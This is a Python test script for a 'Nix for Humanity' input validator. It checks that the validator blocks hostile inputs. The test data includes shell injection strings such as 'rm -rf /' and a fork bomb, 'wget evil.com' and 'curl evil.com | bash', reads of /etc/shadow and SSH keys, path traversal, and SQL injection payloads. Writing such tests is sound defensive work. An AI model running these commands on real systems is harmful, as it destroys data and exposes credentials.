#!/usr/bin/env python3
"""
Simple Security Test Suite for Nix for Humanity
Tests security validations without requiring pytest
"""

import sys
import os
from pathlib import Path

# Add backend to path
backend_path = Path(__file__).parent
sys.path.insert(0, str(backend_path))

from security.input_validator import InputValidator

def test_command_injection():
    """Test command injection prevention"""
    print("\n🔒 Testing Command Injection Prevention...")
    
    dangerous_inputs = [
        ("install firefox; rm -rf /", "command chaining"),
        ("install firefox && wget evil.com", "command chaining with &&"),
        ("install firefox | cat /etc/passwd", "pipe to read sensitive file"),
        ("install firefox`cat /etc/shadow`", "backtick command substitution"),
        ("install firefox$(whoami)", "dollar command substitution"),
        ("install firefox${PATH}", "variable expansion"),
        ("install firefox; :(){ :|:& };:", "fork bomb"),
    ]
    
    passed = 0
    failed = 0
    
    for dangerous_input, description in dangerous_inputs:
        result = InputValidator.validate_input(dangerous_input, 'nlp')
        if not result['valid']:
            print(f"  ✅ Blocked: {description}")
            passed += 1
        else:
            print(f"  ❌ FAILED to block: {description} - Input: '{dangerous_input}'")
            failed += 1
    
    print(f"\nCommand Injection: {passed} passed, {failed} failed")
    return failed == 0

def test_path_traversal():
    """Test path traversal prevention"""
    print("\n🔒 Testing Path Traversal Prevention...")
    
    dangerous_paths = [
        ("../../etc/passwd", "parent directory traversal"),
        ("../../../root/.ssh/id_rsa", "multiple parent traversal"),
        ("/etc/../etc/shadow", "mixed traversal"),
        ("~/../../../etc/passwd", "home directory traversal"),
    ]
    
    passed = 0
    failed = 0
    
    for dangerous_path, description in dangerous_paths:
        result = InputValidator.validate_input(dangerous_path, 'path')
        if not result['valid']:
            print(f"  ✅ Blocked: {description}")
            passed += 1
        else:
            print(f"  ❌ FAILED to block: {description} - Path: '{dangerous_path}'")
            failed += 1
    
    print(f"\nPath Traversal: {passed} passed, {failed} failed")
    return failed == 0

def test_package_validation():
    """Test package name validation"""
    print("\n🔒 Testing Package Name Validation...")
    
    # Valid packages
    valid_packages = [
        ("firefox", "simple package"),
        ("python3", "package with number"),
        ("git-lfs", "package with dash"),
        ("python3.11-numpy", "complex package name"),
    ]
    
    passed = 0
    failed = 0
    
    print("  Valid packages:")
    for package, description in valid_packages:
        result = InputValidator.validate_input(package, 'package')
        if result['valid']:
            print(f"    ✅ Allowed: {description}")
            passed += 1
        else:
            print(f"    ❌ FAILED to allow: {description} - Package: '{package}'")
            failed += 1
    
    # Invalid packages
    invalid_packages = [
        ("firefox; rm -rf /", "command injection in package"),
        ("firefox`whoami`", "backtick in package"),
        ("firefox$(cat /etc/passwd)", "command substitution"),
        ("firefox|grep", "pipe in package"),
        ("rm", "suspicious package name"),
    ]
    
    print("\n  Invalid packages:")
    for package, description in invalid_packages:
        result = InputValidator.validate_input(package, 'package')
        if not result['valid']:
            print(f"    ✅ Blocked: {description}")
            passed += 1
        else:
            print(f"    ❌ FAILED to block: {description} - Package: '{package}'")
            failed += 1
    
    print(f"\nPackage Validation: {passed} passed, {failed} failed")
    return failed == 0

def test_command_validation():
    """Test command validation"""
    print("\n🔒 Testing Command Validation...")
    
    # Valid commands
    valid_commands = [
        (['nix-env', '-iA', 'nixpkgs.firefox'], "install package"),
        (['nixos-rebuild', 'switch'], "rebuild system"),
        (['nix-channel', '--update'], "update channels"),
    ]
    
    passed = 0
    failed = 0
    
    print("  Valid commands:")
    for command, description in valid_commands:
        valid, error = InputValidator.validate_command(command)
        if valid:
            print(f"    ✅ Allowed: {description}")
            passed += 1
        else:
            print(f"    ❌ FAILED to allow: {description} - Error: {error}")
            failed += 1
    
    # Invalid commands
    invalid_commands = [
        (['rm', '-rf', '/'], "dangerous rm command"),
        (['curl', 'evil.com', '|', 'bash'], "curl pipe to bash"),
        (['nix-shell', '--run', 'rm -rf /'], "dangerous nix-shell"),
        (['../../bin/bash'], "path traversal in command"),
    ]
    
    print("\n  Invalid commands:")
    for command, description in invalid_commands:
        valid, error = InputValidator.validate_command(command)
        if not valid:
            print(f"    ✅ Blocked: {description}")
            passed += 1
        else:
            print(f"    ❌ FAILED to block: {description} - Command: {command}")
            failed += 1
    
    print(f"\nCommand Validation: {passed} passed, {failed} failed")
    return failed == 0

def test_sql_injection():
    """Test SQL injection prevention"""
    print("\n🔒 Testing SQL Injection Prevention...")
    
    sql_attempts = [
        ("search firefox'; DROP TABLE packages; --", "SQL drop table"),
        ("search firefox' OR 1=1 --", "SQL always true"),
        ("search firefox' UNION SELECT * FROM users --", "SQL union select"),
    ]
    
    passed = 0
    failed = 0
    
    for sql_attempt, description in sql_attempts:
        result = InputValidator.validate_input(sql_attempt, 'nlp')
        if not result['valid']:
            print(f"  ✅ Blocked: {description}")
            passed += 1
        else:
            print(f"  ❌ FAILED to block: {description} - Input: '{sql_attempt}'")
            failed += 1
    
    print(f"\nSQL Injection: {passed} passed, {failed} failed")
    return failed == 0

def test_input_sanitization():
    """Test input sanitization"""
    print("\n🔒 Testing Input Sanitization...")
    
    # Test whitespace normalization
    dirty_input = "install   firefox\n\n\t  please"
    result = InputValidator.validate_input(dirty_input, 'nlp')
    
    if result['valid'] and result['sanitized_input'] == "install firefox please":
        print("  ✅ Whitespace normalization works")
        return True
    else:
        print(f"  ❌ Whitespace normalization failed")
        print(f"     Expected: 'install firefox please'")
        print(f"     Got: '{result.get('sanitized_input', 'N/A')}'")
        return False

def main():
    """Run all security tests"""
    print("🔐 Nix for Humanity Security Test Suite")
    print("=" * 50)
    
    all_passed = True
    
    # Run all tests
    tests = [
        test_command_injection,
        test_path_traversal,
        test_package_validation,
        test_command_validation,
        test_sql_injection,
        test_input_sanitization,
    ]
    
    for test in tests:
        if not test():
            all_passed = False
    
    print("\n" + "=" * 50)
    if all_passed:
        print("✅ All security tests passed!")
    else:
        print("❌ Some security tests failed - review the output above")
    
    return 0 if all_passed else 1

if __name__ == "__main__":
    sys.exit(main())